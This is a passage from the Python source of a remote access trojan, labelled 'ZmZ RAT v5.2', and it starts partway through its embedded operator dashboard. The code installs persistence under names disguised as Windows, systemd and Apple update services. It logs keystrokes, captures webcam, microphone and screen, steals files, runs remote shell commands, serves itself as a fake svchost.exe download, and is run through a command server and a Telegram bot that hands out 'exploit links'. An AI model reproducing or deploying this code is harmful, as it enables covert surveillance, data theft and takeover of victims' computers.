            .then(res => res.json())
            .then(data => {
                if (data.output) {
                    document.getElementById('surveillancePreview').innerHTML = 
                        `<pre style="color:#0f0;">${data.output}</pre>`;
                }
            });
        }
        
        function recordAudio() {
            fetch('/api/command', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({client_id: clientId, command: 'record_audio'})
            })
            .then(res => res.json())
            .then(data => {
                if (data.output && !data.output.startsWith('[!]')) {
                    const audio = new Audio('data:audio/wav;base64,' + data.output);
                    audio.play();
                }
            });
        }
        
        // File functions
        function listFiles() {
            const path = document.getElementById('filePath').value;
            const fileList = document.getElementById('fileList');
            fileList.innerHTML = '<div class="loading"></div>';
            
            fetch('/api/command', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({client_id: clientId, command: 'files', args: path})
            })
            .then(res => res.json())
            .then(data => {
                try {
                    const files = JSON.parse(data.output);
                    let html = '';
                    files.forEach(file => {
                        html += `
                            <div class="file-item" ondblclick="downloadFile('${file.path}')">
                                <span class="file-name">${file.is_dir ? '📁' : '📄'} ${file.name}</span>
                                <span class="file-size">${file.is_dir ? '' : (file.size/1024).toFixed(1) + ' KB'}</span>
                            </div>
                        `;
                    });
                    fileList.innerHTML = html;
                } catch {
                    fileList.innerHTML = `<div class="preview-text">${data.output}</div>`;
                }
            });
        }
        
        function downloadFile(path) {
            fetch('/api/command', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({client_id: clientId, command: 'download', args: path})
            })
            .then(res => res.json())
            .then(data => {
                if (data.output && !data.output.startsWith('[!]')) {
                    const link = document.createElement('a');
                    link.href = 'data:application/octet-stream;base64,' + data.output;
                    link.download = path.split('\\\\').pop();
                    link.click();
                }
            });
        }
        
        // Terminal functions
        function executeTerminal() {
            const input = document.getElementById('terminalInput');
            const cmd = input.value.trim();
            const terminal = document.getElementById('terminalOutput');
            
            if (cmd) {
                terminal.innerHTML += `<div class="terminal-line">> ${cmd}</div>`;
                
                fetch('/api/command', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({client_id: clientId, command: 'shell', args: cmd})
                })
                .then(res => res.json())
                .then(data => {
                    const lines = data.output.split('\\n');
                    lines.forEach(line => {
                        if (line.trim()) {
                            terminal.innerHTML += `<div class="terminal-line">${line}</div>`;
                        }
                    });
                    terminal.scrollTop = terminal.scrollHeight;
                });
                
                input.value = '';
            }
        }
        
        function handleTerminalKey(event) {
            if (event.key === 'Enter') executeTerminal();
        }
        
        // System functions
        function lockSystem() {
            if (confirm('Lock the system?')) {
                fetch('/api/command', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({client_id: clientId, command: 'lock'})
                });
            }
        }
        
        function restartSystem() {
            if (confirm('Restart the system?')) {
                fetch('/api/command', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({client_id: clientId, command: 'restart'})
                });
            }
        }
        
        function shutdownSystem() {
            if (confirm('Shutdown the system?')) {
                fetch('/api/command', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({client_id: clientId, command: 'shutdown'})
                });
            }
        }
        
        function installPersistence() {
            fetch('/api/command', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({client_id: clientId, command: 'persist'})
            }).then(() => alert('Persistence installed'));
        }
        
        function selfDestruct() {
            if (confirm('⚠️ This will permanently delete the client! Continue?')) {
                fetch('/api/command', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({client_id: clientId, command: 'selfdestruct'})
                });
            }
        }
        
        // Network functions
        function getNetworkInterfaces() {
            const preview = document.getElementById('networkPreview');
            preview.innerHTML = '<div class="loading"></div>';
            
            fetch('/api/command', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({client_id: clientId, command: 'network_info'})
            })
            .then(res => res.json())
            .then(data => {
                try {
                    const info = JSON.parse(data.output);
                    let html = '<div style="text-align:left;">';
                    for (let [iface, details] of Object.entries(info)) {
                        html += `<b>${iface}:</b><br>`;
                        html += `IPv4: ${details.ipv4}<br>`;
                        html += `MAC: ${details.mac}<br><br>`;
                    }
                    html += '</div>';
                    preview.innerHTML = html;
                } catch {
                    preview.innerHTML = `<div class="preview-text">${data.output}</div>`;
                }
            });
        }
        
        function scanPorts() {
            const preview = document.getElementById('networkPreview');
            preview.innerHTML = '<div class="loading"></div> Scanning ports...';
            
            fetch('/api/command', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({client_id: clientId, command: 'shell', args: 'netstat -an'})
            })
            .then(res => res.json())
            .then(data => {
                preview.innerHTML = `<pre style="color:#0f0;">${data.output}</pre>`;
            });
        }
        
        // Processes functions
        function getProcesses() {
            const list = document.getElementById('processesList');
            list.innerHTML = '<div class="loading"></div>';
            
            fetch('/api/command', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({client_id: clientId, command: 'processes'})
            })
            .then(res => res.json())
            .then(data => {
                try {
                    const processes = JSON.parse(data.output);
                    let html = '';
                    processes.forEach(proc => {
                        html += `
                            <div class="file-item">
                                <span class="file-name">${proc.name}</span>
                                <span class="file-size">PID: ${proc.pid} | CPU: ${proc.cpu_percent.toFixed(1)}%</span>
                            </div>
                        `;
                    });
                    list.innerHTML = html;
                } catch {
                    list.innerHTML = `<div class="preview-text">${data.output}</div>`;
                }
            });
        }
        
        // WebSocket events
        socket.on('resource_update', (data) => {
            if (systemChart) {
                const now = new Date().toLocaleTimeString();
                
                if (systemChart.data.labels.length > 20) {
                    systemChart.data.labels.shift();
                    systemChart.data.datasets[0].data.shift();
                    systemChart.data.datasets[1].data.shift();
                }
                
                systemChart.data.labels.push(now);
                systemChart.data.datasets[0].data.push(data.cpu || 0);
                systemChart.data.datasets[1].data.push(data.ram || 0);
                systemChart.update();
            }
        });
        
        // Initialize
        loadClientInfo();
        initSystemChart();
        setInterval(loadClientInfo, 2000);
        listFiles();
    </script>
</body>
</html>
'''

# ====================== PERSISTENCE MODULE ======================
class PersistenceManager:
    @staticmethod
    def install_windows():
        try:
            import winreg
            if getattr(sys, 'frozen', False):
                exe_path = sys.executable
            else:
                exe_path = os.path.abspath(__file__)
            
            persistent_path = os.path.expanduser("~\\AppData\\Roaming\\Microsoft\\Windows\\System32\\svchost.exe")
            if not os.path.exists(os.path.dirname(persistent_path)):
                os.makedirs(os.path.dirname(persistent_path))
            shutil.copy2(exe_path, persistent_path)
            ctypes.windll.kernel32.SetFileAttributesW(persistent_path, 2)
            
            key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, 
                                "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 
                                0, winreg.KEY_SET_VALUE)
            winreg.SetValueEx(key, "WindowsUpdate", 0, winreg.REG_SZ, f'"{persistent_path}" server')
            winreg.CloseKey(key)
            
            os.system(f'schtasks /create /tn "MicrosoftUpdate" /tr "{persistent_path} server" /sc onlogon /f')
            return True
        except:
            return False
    
    @staticmethod
    def install_linux():
        try:
            if getattr(sys, 'frozen', False):
                exe_path = sys.executable
            else:
                exe_path = os.path.abspath(__file__)
            
            persistent_path = "/usr/lib/systemd/system-update"
            shutil.copy2(exe_path, persistent_path)
            os.chmod(persistent_path, 0o755)
            
            service_content = f'''[Unit]
Description=System Update Service
After=network.target

[Service]
Type=simple
ExecStart={persistent_path} client localhost 4444
Restart=always
RestartSec=10

[Install]
WantedBy=multi-user.target'''
            
            with open("/etc/systemd/system/system-update.service", "w") as f:
                f.write(service_content)
            
            os.system("systemctl daemon-reload")
            os.system("systemctl enable system-update.service")
            os.system("systemctl start system-update.service")
            return True
        except:
            return False
    
    @staticmethod
    def install_macos():
        try:
            if getattr(sys, 'frozen', False):
                exe_path = sys.executable
            else:
                exe_path = os.path.abspath(__file__)
            
            persistent_path = "/Library/Application Support/Apple/SystemUpdate"
            os.makedirs(os.path.dirname(persistent_path), exist_ok=True)
            shutil.copy2(exe_path, persistent_path)
            os.chmod(persistent_path, 0o755)
            
            plist_content = f'''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>Label</key>
    <string>com.apple.systemupdate</string>
    <key>ProgramArguments</key>
    <array>
        <string>{persistent_path}</string>
        <string>client</string>
        <string>localhost</string>
        <string>4444</string>
    </array>
    <key>RunAtLoad</key>
    <true/>
    <key>KeepAlive</key>
    <true/>
</dict>
</plist>'''
            
            with open("/Library/LaunchDaemons/com.apple.systemupdate.plist", "w") as f:
                f.write(plist_content)
            
            os.system("launchctl load /Library/LaunchDaemons/com.apple.systemupdate.plist")
            return True
        except:
            return False
    
    @staticmethod
    def install_all():
        system = platform.system()
        if system == "Windows":
            return PersistenceManager.install_windows()
        elif system == "Linux":
            return PersistenceManager.install_linux()
        elif system == "Darwin":
            return PersistenceManager.install_macos()
        return False

# ====================== RAT CLIENT ======================
class ZmZClient:
    def __init__(self, server_host=None, server_port=None):
        self.server_host = server_host
        self.server_port = server_port
        self.client = None
        self.webcam = None
        self.keylogger_running = False
        self.keylog_data = []
        self.is_running = True
        self.persistent = False
        self.device_id = self.get_device_id()
        
        self.command_handlers = {
            'info': self.get_system_info,
            'screenshot': self.take_screenshot,
            'webcam': self.capture_webcam,
            'start_webcam': self.start_webcam,
            'stop_webcam': self.stop_webcam,
            'keylogger_start': self.start_keylogger,
            'keylogger_stop': self.stop_keylogger,
            'record_audio': self.record_audio,
            'files': self.list_files,
            'download': self.download_file,
            'upload': self.upload_file,
            'shell': self.execute_shell,
            'processes': self.get_processes,
            'network_info': self.get_network_info,
            'lock': self.lock_system,
            'restart': self.restart_system,
            'shutdown': self.shutdown_system,
            'persist': self.install_persistence,
            'selfdestruct': self.self_destruct
        }
        
        self.install_persistence()
        self.reconnect_thread = threading.Thread(target=self.auto_reconnect)
        self.reconnect_thread.daemon = True
        self.reconnect_thread.start()
    
    def get_device_id(self):
        try:
            identifiers = [
                socket.gethostname(),
                str(uuid.getnode()),
                platform.node(),
                getpass.getuser()
            ]
            return hashlib.md5(''.join(identifiers).encode()).hexdigest()[:8]
        except:
            return str(random.randint(100000, 999999))
    
    def install_persistence(self, args=None):
        if not self.persistent:
            result = PersistenceManager.install_all()
            if result:
                self.persistent = True
                return "[+] Persistence installed"
        return "[+] Persistence already active" if self.persistent else "[-] Failed"
    
    def auto_reconnect(self):
        while self.is_running:
            try:
                self.connect_to_server()
            except:
                pass
            time.sleep(30)
    
    def connect_to_server(self):
        try:
            self.client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.client.connect((self.server_host, self.server_port))
            
            info = self.get_system_info()
            self.client.send(f"{self.device_id}:{info}".encode())
            
            self.handle_commands()
            return True
        except:
            self.client = None
            return False
    
    def handle_commands(self):
        while self.is_running and self.client:
            try:
                data = self.client.recv(16384).decode('utf-8')
                if not data:
                    break
                
                parts = data.strip().split(' ', 1)
                cmd = parts[0].lower()
                args = parts[1] if len(parts) > 1 else None
                
                if cmd in self.command_handlers:
                    response = self.command_handlers[cmd](args)
                else:
                    response = f"[!] Unknown: {cmd}"
                
                if response:
                    if len(response) > 8192:
                        for i in range(0, len(response), 8192):
                            self.client.send(response[i:i+8192].encode())
                            time.sleep(0.1)
                    else:
                        self.client.send(response.encode())
            except:
                break
        
        if self.client:
            self.client.close()
            self.client = None
    
    def get_system_info(self, args=None):
        info = {
            'device_id': self.device_id,
            'hostname': socket.gethostname(),
            'platform': platform.system(),
            'platform_version': platform.version(),
            'architecture': platform.machine(),
            'processor': platform.processor(),
            'cpu_count': psutil.cpu_count(),
            'cpu_percent': psutil.cpu_percent(interval=1),
            'ram_total': f"{psutil.virtual_memory().total / (1024**3):.2f} GB",
            'ram_available': f"{psutil.virtual_memory().available / (1024**3):.2f} GB",
            'ram_percent': psutil.virtual_memory().percent,
            'disk_total': f"{psutil.disk_usage('/').total / (1024**3):.2f} GB",
            'disk_free': f"{psutil.disk_usage('/').free / (1024**3):.2f} GB",
            'disk_percent': psutil.disk_usage('/').percent,
            'ip_public': self.get_public_ip(),
            'ip_local': self.get_local_ip(),
            'mac': self.get_mac_address(),
            'username': getpass.getuser(),
            'boot_time': datetime.datetime.fromtimestamp(psutil.boot_time()).strftime("%Y-%m-%d %H:%M:%S"),
            'current_time': datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
            'persistent': self.persistent
        }
        return json.dumps(info)
    
    def get_public_ip(self):
        try:
            return requests.get('https://api.ipify.org', timeout=5).text
        except:
            return "Unknown"
    
    def get_local_ip(self):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(("8.8.8.8", 80))
            ip = s.getsockname()[0]
            s.close()
            return ip
        except:
            return "127.0.0.1"
    
    def get_mac_address(self):
        try:
            for interface in netifaces.interfaces():
                addr = netifaces.ifaddresses(interface).get(netifaces.AF_LINK)
                if addr:
                    return addr[0]['addr']
        except:
            pass
        return ':'.join(['{:02x}'.format((uuid.getnode() >> i) & 0xff) for i in range(0,8*6,8)][::-1])
    
    def take_screenshot(self, args=None):
        try:
            screenshot = ImageGrab.grab()
            img_buffer = io.BytesIO()
            screenshot.save(img_buffer, format='PNG')
            img_buffer.seek(0)
            return base64.b64encode(img_buffer.getvalue()).decode()
        except Exception as e:
            return f"[!] Error: {e}"
    
    def capture_webcam(self, args=None):
        try:
            cap = cv2.VideoCapture(0)
            ret, frame = cap.read()
            cap.release()
            
            if ret:
                _, buffer = cv2.imencode('.jpg', frame)
                return base64.b64encode(buffer).decode()
            return "[!] No camera"
        except:
            return "[!] Camera error"
    
    def start_webcam(self, args=None):
        try:
            if not self.webcam:
                self.webcam = cv2.VideoCapture(0)
            return "[+] Webcam started"
        except:
            return "[!] Failed"
    
    def stop_webcam(self, args=None):
        try:
            if self.webcam:
                self.webcam.release()
                self.webcam = None
            return "[+] Webcam stopped"
        except:
            return "[!] Failed"
    
    def get_webcam_frame(self):
        if self.webcam:
            ret, frame = self.webcam.read()
            if ret:
                _, buffer = cv2.imencode('.jpg', frame)
                return buffer.tobytes()
        return None
    
    def start_keylogger(self, args=None):
        self.keylogger_running = True
        self.keylog_data = []
        
        def on_press(key):
            if self.keylogger_running:
                try:
                    self.keylog_data.append(str(key.char))
                except:
                    self.keylog_data.append(f"[{key}]")
        
        listener = keyboard.Listener(on_press=on_press)
        listener.daemon = True
        listener.start()
        return "[+] Keylogger started"
    
    def stop_keylogger(self, args=None):
        self.keylogger_running = False
        log = ''.join(self.keylog_data)
        return log
    
    def record_audio(self, args=None):
        try:
            duration = 5
            fs = 44100
            recording = sd.rec(int(duration * fs), samplerate=fs, channels=2, dtype='int16')
            sd.wait()
            
            import scipy.io.wavfile
            temp_file = tempfile.NamedTemporaryFile(delete=False, suffix='.wav')
            scipy.io.wavfile.write(temp_file.name, fs, recording)
            
            with open(temp_file.name, 'rb') as f:
                data = f.read()
            
            os.unlink(temp_file.name)
            return base64.b64encode(data).decode()
        except:
            return "[!] Audio error"
    
    def list_files(self, args=None):
        path = args or os.path.expanduser("~")
        files = []
        try:
            for item in os.listdir(path):
                full_path = os.path.join(path, item)
                try:
                    stat = os.stat(full_path)
                    files.append({
                        'name': item,
                        'path': full_path,
                        'size': stat.st_size,
                        'is_dir': os.path.isdir(full_path)
                    })
                except:
                    pass
        except:
            pass
        return json.dumps(files[:100])
    
    def download_file(self, args=None):
        if args and os.path.exists(args):
            try:
                with open(args, 'rb') as f:
                    return base64.b64encode(f.read()).decode()
            except:
                pass
        return "[!] File not found"
    
    def upload_file(self, args=None):
        try:
            if args and ':' in args:
                filename, data = args.split(':', 1)
                data = base64.b64decode(data)
                with open(filename, 'wb') as f:
                    f.write(data)
                return f"[+] Uploaded: {filename}"
        except:
            pass
        return "[!] Upload failed"
    
    def execute_shell(self, args=None):
        try:
            if args:
                result = subprocess.check_output(args, shell=True, stderr=subprocess.STDOUT, timeout=30)
                return result.decode('utf-8', errors='ignore')
        except subprocess.TimeoutExpired:
            return "[!] Timeout"
        except Exception as e:
            return f"[!] Error: {e}"
    
    def get_processes(self, args=None):
        processes = []
        for proc in psutil.process_iter(['pid', 'name', 'cpu_percent', 'memory_percent']):
            try:
                processes.append(proc.info)
            except:
                pass
        return json.dumps(processes[:50])
    
    def get_network_info(self, args=None):
        info = {}
        try:
            for interface in netifaces.interfaces():
                addrs = netifaces.ifaddresses(interface)
                info[interface] = {
                    'ipv4': addrs.get(netifaces.AF_INET, [{}])[0].get('addr', 'N/A'),
                    'mac': addrs.get(netifaces.AF_LINK, [{}])[0].get('addr', 'N/A')
                }
        except:
            pass
        return json.dumps(info)
    
    def lock_system(self, args=None):
        try:
            if platform.system() == "Windows":
                ctypes.windll.user32.LockWorkStation()
            elif platform.system() == "Linux":
                subprocess.run(["gnome-screensaver-command", "-l"])
            elif platform.system() == "Darwin":
                subprocess.run(["pmset", "displaysleepnow"])
            return "[+] System locked"
        except:
            return "[!] Lock failed"
    
    def restart_system(self, args=None):
        try:
            if platform.system() == "Windows":
                subprocess.run(["shutdown", "/r", "/t", "0"])
            elif platform.system() == "Linux":
                subprocess.run(["reboot"])
            elif platform.system() == "Darwin":
                subprocess.run(["sudo", "shutdown", "-r", "now"])
            return "[+] Restarting..."
        except:
            return "[!] Restart failed"
    
    def shutdown_system(self, args=None):
        try:
            if platform.system() == "Windows":
                subprocess.run(["shutdown", "/s", "/t", "0"])
            elif platform.system() == "Linux":
                subprocess.run(["shutdown", "-h", "now"])
            elif platform.system() == "Darwin":
                subprocess.run(["sudo", "shutdown", "-h", "now"])
            return "[+] Shutting down..."
        except:
            return "[!] Shutdown failed"
    
    def self_destruct(self, args=None):
        try:
            if platform.system() == "Windows":
                os.system('reg delete "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" /v "WindowsUpdate" /f')
                os.system('schtasks /delete /tn "MicrosoftUpdate" /f')
            
            self.is_running = False
            if getattr(sys, 'frozen', False):
                os.remove(sys.executable)
            else:
                os.remove(__file__)
            sys.exit(0)
        except:
            pass

# ====================== FLASK WEB INTERFACE ======================
app = Flask(__name__)
app.config['SECRET_KEY'] = os.urandom(24)
socketio = SocketIO(app, cors_allowed_origins="*", async_mode='threading')

clients = {}
client_instances = {}

@app.route('/')
def index():
    return render_template_string(INDEX_HTML)

@app.route('/dashboard')
def dashboard():
    return render_template_string(DASHBOARD_HTML)

@app.route('/client/<client_id>')
def client_page(client_id):
    return render_template_string(CLIENT_HTML)

@app.route('/payload.exe')
def serve_windows_payload():
    with open(__file__, 'rb') as f:
        data = f.read()
    response = make_response(data)
    response.headers['Content-Type'] = 'application/octet-stream'
    response.headers['Content-Disposition'] = 'attachment; filename=svchost.exe'
    return response

@app.route('/payload.bin')
def serve_payload():
    with open(__file__, 'rb') as f:
        data = f.read()
    return data

@app.route('/api/clients')
def api_clients():
    client_list = []
    for cid, client in clients.items():
        try:
            last_seen = datetime.datetime.fromisoformat(client.get('last_seen', '2000-01-01'))
            now = datetime.datetime.now()
            is_online = (now - last_seen).total_seconds() < 60
            
            client_list.append({
                'id': cid,
                'hostname': client.get('hostname', 'Unknown'),
                'ip': client.get('ip_local', 'Unknown'),
                'os': client.get('platform', 'Unknown'),
                'last_seen': client.get('last_seen', 'Never'),
                'persistent': client.get('persistent', False),
                'online': is_online
            })
        except:
            pass
    return jsonify(client_list)

@app.route('/api/client/<client_id>')
def api_client(client_id):
    if client_id in clients:
        return jsonify(clients[client_id])
    return jsonify({'error': 'Not found'}), 404

@app.route('/api/command', methods=['POST'])
def api_command():
    data = request.json
    client_id = data.get('client_id')
    cmd = data.get('command')
    args = data.get('args')
    
    if client_id in client_instances:
        client = client_instances[client_id]
        if cmd in client.command_handlers:
            response = client.command_handlers[cmd](args)
            return jsonify({'output': response})
    
    return jsonify({'error': 'Failed'}), 400

@app.route('/api/broadcast', methods=['POST'])
def api_broadcast():
    data = request.json
    cmd = data.get('command')
    args = data.get('args')
    
    results = {}
    for cid, client in client_instances.items():
        if cmd in client.command_handlers:
            results[cid] = client.command_handlers[cmd](args)
    return jsonify(results)

@app.route('/video_feed/<client_id>')
def video_feed(client_id):
    def generate():
        while True:
            if client_id in client_instances:
                frame = client_instances[client_id].get_webcam_frame()
                if frame:
                    yield (b'--frame\r\n'
                           b'Content-Type: image/jpeg\r\n\r\n' + frame + b'\r\n')
            time.sleep(0.03)
    return Response(generate(), mimetype='multipart/x-mixed-replace; boundary=frame')

@socketio.on('connect')
def handle_connect():
    emit('connected', {'data': 'Connected'})

@socketio.on('disconnect')
def handle_disconnect():
    pass

# ====================== TCP SERVER ======================
class TCPServer:
    def __init__(self, host='0.0.0.0', port=4444):
        self.host = host
        self.port = port
        self.server = None
        self.running = True
    
    def start(self):
        self.server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.server.bind((self.host, self.port))
        self.server.listen(5)
        
        print(f"[+] TCP Server listening on {self.host}:{self.port}")
        
        while self.running:
            try:
                client_socket, address = self.server.accept()
                client_thread = threading.Thread(target=self.handle_client, args=(client_socket, address))
                client_thread.daemon = True
                client_thread.start()
            except:
                break
    
    def handle_client(self, client_socket, address):
        client_id = None
        try:
            data = client_socket.recv(16384).decode('utf-8')
            if ':' in data:
                client_id, info = data.split(':', 1)
                try:
                    client_info = json.loads(info)
                    clients[client_id] = client_info
                    clients[client_id]['last_seen'] = datetime.datetime.now().isoformat()
                    
                    client = ZmZClient(self.host, self.port)
                    client.client = client_socket
                    client.device_id = client_id
                    client_instances[client_id] = client
                    
                    print(f"[+] Client connected: {client_id} from {address[0]}:{address[1]}")
                    socketio.emit('client_connected', {'id': client_id, 'hostname': client_info.get('hostname')})
                    
                    client.handle_commands()
                except Exception as e:
                    print(f"[!] Error handling client: {e}")
        except Exception as e:
            print(f"[!] Connection error: {e}")
        finally:
            if client_id and client_id in clients:
                socketio.emit('client_disconnected', {'id': client_id})
            client_socket.close()

# ====================== TELEGRAM BOT ======================
class TelegramBot:
    def __init__(self, token):
        self.bot = telebot.TeleBot(token)
        self.setup_handlers()
    
    def setup_handlers(self):
        @self.bot.message_handler(commands=['start'])
        def start(message):
            markup = types.InlineKeyboardMarkup(row_width=2)
            markup.add(
                types.InlineKeyboardButton('Generate Link', callback_data='generate'),
                types.InlineKeyboardButton('List Clients', callback_data='list'),
                types.InlineKeyboardButton('Statistics', callback_data='stats'),
                types.InlineKeyboardButton('Help', callback_data='help')
            )
            
            self.bot.reply_to(message, 
                "🔥 *ZmZ RAT v5.2*\n\n"
                "Commands:\n"
                "/generate - Generate exploit link\n"
                "/list - List connected devices\n"
                "/stats - Show statistics\n"
                "/broadcast - Send command to all\n"
                "/client <id> - Control specific device",
                parse_mode='Markdown',
                reply_markup=markup)
        
        @self.bot.message_handler(commands=['generate'])
        def generate(message):
            link = f"http://{self.get_public_ip()}:5000/"
            self.bot.reply_to(message, f"🔗 *Exploit Link:*\n`{link}`", parse_mode='Markdown')
        
        @self.bot.message_handler(commands=['list'])
        def list_clients(message):
            if not clients:
                self.bot.reply_to(message, "No clients connected")
                return
            
            text = "📱 *Connected Devices:*\n\n"
            for cid, client in list(clients.items())[:10]:
                text += f"*ID:* `{cid}`\n"
                text += f"*Host:* {client.get('hostname', 'Unknown')}\n"
                text += f"*IP:* {client.get('ip_local', 'Unknown')}\n"
                text += "-------------------\n"
            
            self.bot.reply_to(message, text, parse_mode='Markdown')
        
        @self.bot.message_handler(commands=['stats'])
        def stats(message):
            total = len(clients)
            windows = sum(1 for c in clients.values() if c.get('platform') == 'Windows')
            linux = sum(1 for c in clients.values() if c.get('platform') == 'Linux')
            macos = sum(1 for c in clients.values() if c.get('platform') == 'Darwin')
            persistent = sum(1 for c in clients.values() if c.get('persistent', False))
            
            text = f"📊 *Statistics:*\n\n"
            text += f"Total: {total}\n"
            text += f"Windows: {windows}\n"
            text += f"Linux: {linux}\n"
            text += f"macOS: {macos}\n"
            text += f"Persistent: {persistent}\n"
            
            self.bot.reply_to(message, text, parse_mode='Markdown')
        
        @self.bot.callback_query_handler(func=lambda call: True)
        def callback_handler(call):
            if call.data == 'generate':
                link = f"http://{self.get_public_ip()}:5000/"
                self.bot.send_message(call.message.chat.id, f"🔗 {link}")
            elif call.data == 'list':
                list_clients(call.message)
            elif call.data == 'stats':
                stats(call.message)
    
    def get_public_ip(self):
        try:
            return requests.get('https://api.ipify.org').text
        except:
            return "localhost"
    
    def start(self):
        print("[+] Telegram bot started")
        self.bot.polling(none_stop=True)

# ====================== MAIN ======================
def main():
    print(f"""
    ╔═══════════════════════════════════════╗
    ║     Rez RAT v{VERSION} - Ultimate      ║
    ║    Real-Time Remote Access Tool       ║
    ║         Author: {AUTHOR}                ║
    ╚═══════════════════════════════════════╝
    """)
    
    if len(sys.argv) < 2:
        print("Usage:")
        print("  python rat.py client <server_ip> <port>  - Run as client")
        print("  python rat.py server                     - Run as server (all components)")
        print("  python rat.py web                        - Run web interface only")
        print("  python rat.py tcp                        - Run TCP server only")
        return
    
    mode = sys.argv[1]
    
    if mode == "client" and len(sys.argv) >= 4:
        client = ZmZClient(sys.argv[2], int(sys.argv[3]))
        while True:
            time.sleep(1)
    
    elif mode == "server":
        print("[+] Starting all components...")
        
        # Start TCP server
        tcp_server = TCPServer(SERVER_HOST, SERVER_PORT)
        tcp_thread = threading.Thread(target=tcp_server.start)
        tcp_thread.daemon = True
        tcp_thread.start()
        
        # Start web server
        print(f"[+] Web server on http://localhost:{WEB_PORT}")
        web_thread = threading.Thread(target=lambda: socketio.run(app, host='0.0.0.0', port=WEB_PORT, debug=False, use_reloader=False))
        web_thread.daemon = True
        web_thread.start()
        
        # Start Telegram bot if token provided
        if TELEGRAM_TOKEN != "YOUR_BOT_TOKEN":
            bot = TelegramBot(TELEGRAM_TOKEN)
            bot_thread = threading.Thread(target=bot.start)
            bot_thread.daemon = True
            bot_thread.start()
        
        print("[+] All components started successfully!")
        print("[+] Press Ctrl+C to stop")
        
        try:
            while True:
                time.sleep(1)
        except KeyboardInterrupt:
            print("\n[+] Shutting down...")
            sys.exit(0)
    
    elif mode == "web":
        socketio.run(app, host='0.0.0.0', port=WEB_PORT, debug=False)
    
    elif mode == "tcp":
        tcp_server = TCPServer(SERVER_HOST, SERVER_PORT)
        tcp_server.start()

if __name__ == "__main__":
    main()
